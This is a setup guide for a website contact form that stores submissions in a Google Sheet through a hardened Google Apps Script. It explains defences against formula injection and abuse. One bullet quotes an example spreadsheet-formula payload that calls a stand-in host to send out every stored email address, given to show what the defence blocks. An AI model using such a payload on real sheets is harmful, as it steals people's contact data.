# Contact Form: Google Apps Script Setup

## Step 1: Create a Google Sheet

1. Go to [Google Sheets](https://sheets.google.com) and create a new spreadsheet
2. Name it "Website Contact Form"
3. In Row 1, add headers: `Timestamp | Name | Email | Message`

## Step 2: Create the Apps Script

1. In your Google Sheet, go to **Extensions > Apps Script**
2. Replace the default code with:

```javascript
var RECIPIENT = 'stevenmacenski@gmail.com';
var MAX = { name: 100, email: 254, message: 5000 };
var RATE_LIMIT = 20;    // submissions accepted per window
var RATE_WINDOW = 600;  // window length in seconds

// A cell whose text starts with = + - @ is evaluated as a formula by Sheets,
// which would let a submitter run IMPORTDATA/HYPERLINK against this sheet and
// read back earlier rows. Leading apostrophe forces plain text.
function deformula_(s) {
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

function clean_(v, max) {
  if (typeof v !== 'string') return '';
  var stripped = v.replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f]/g, '');
  return deformula_(stripped.trim().slice(0, max));
}

function json_(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

function doPost(e) {
  try {
    if (!e || !e.postData || !e.postData.contents) return json_({ result: 'error' });

    var data;
    try {
      data = JSON.parse(e.postData.contents);
    } catch (parseErr) {
      return json_({ result: 'error' });
    }
    if (!data || typeof data !== 'object') return json_({ result: 'error' });

    // Honeypot: the form's hidden "website" field is invisible to humans.
    // Report success so bots don't learn they were filtered.
    if (data.website) return json_({ result: 'success' });

    var name = clean_(data.name, MAX.name);
    var email = clean_(data.email, MAX.email);
    var message = clean_(data.message, MAX.message);

    if (!name || !message) return json_({ result: 'error' });
    if (!/^[^@\s]+@[^@\s.]+\.[^@\s]+$/.test(email)) return json_({ result: 'error' });

    // The endpoint is public and unauthenticated, so throttle globally to keep
    // scripted abuse from draining the daily MailApp quota. Apps Script does
    // not expose the client IP to doPost, so per-sender limiting isn't possible.
    var cache = CacheService.getScriptCache();
    var count = Number(cache.get('rate') || 0);
    if (count >= RATE_LIMIT) return json_({ result: 'error' });
    cache.put('rate', String(count + 1), RATE_WINDOW);

    var lock = LockService.getScriptLock();
    lock.waitLock(10000);
    try {
      SpreadsheetApp.getActiveSpreadsheet().getActiveSheet()
        .appendRow([new Date(), name, email, message]);
    } finally {
      lock.releaseLock();
    }

    MailApp.sendEmail({
      to: RECIPIENT,
      replyTo: email,
      subject: 'Website Contact Form',  // constant: no submitter text in headers
      body: 'From: ' + name + ' <' + email + '>\n\n' + message
    });

    return json_({ result: 'success' });
  } catch (err) {
    console.error(err);  // stays in the Apps Script log, never returned
    return json_({ result: 'error' });
  }
}
```

### What this hardening covers

- **Formula injection** — `deformula_` prefixes any value starting with `=`, `+`, `-`, or `@`
  so Sheets stores it as text instead of evaluating it. Without this, a submitted
  name like `=IMPORTDATA("https://evil.tld/?d="&ENCODEURL(JOIN(",",C:C)))` would
  exfiltrate every previously collected email address when you open the sheet.
- **Abuse / quota exhaustion** — honeypot field plus a global rate limit, since a
  static site has no way to authenticate callers.
- **Input validation** — type checks, length caps, control-character stripping, a
  server-side email format check (the form's `type="email"` is bypassed by posting
  directly), and a `LockService` lock so concurrent writes can't interleave.
- **Header hygiene** — the subject is a constant and the submitter's address goes in
  `replyTo`, so untrusted text never lands in a mail header.

3. Save the project

## Step 3: Deploy as Web App

1. Click **Deploy > New deployment**
2. Select type: **Web app**
3. Set "Execute as": **Me**
4. Set "Who has access": **Anyone**
5. Click **Deploy**
6. Copy the Web App URL

## Step 4: Update Your Website

1. Open `content/contact/_index.md`
2. Replace `YOUR_GOOGLE_APPS_SCRIPT_URL` with the URL from Step 3

## Testing

Submit a test message through your contact form. You should:
- See a new row in your Google Sheet
- Receive an email notification
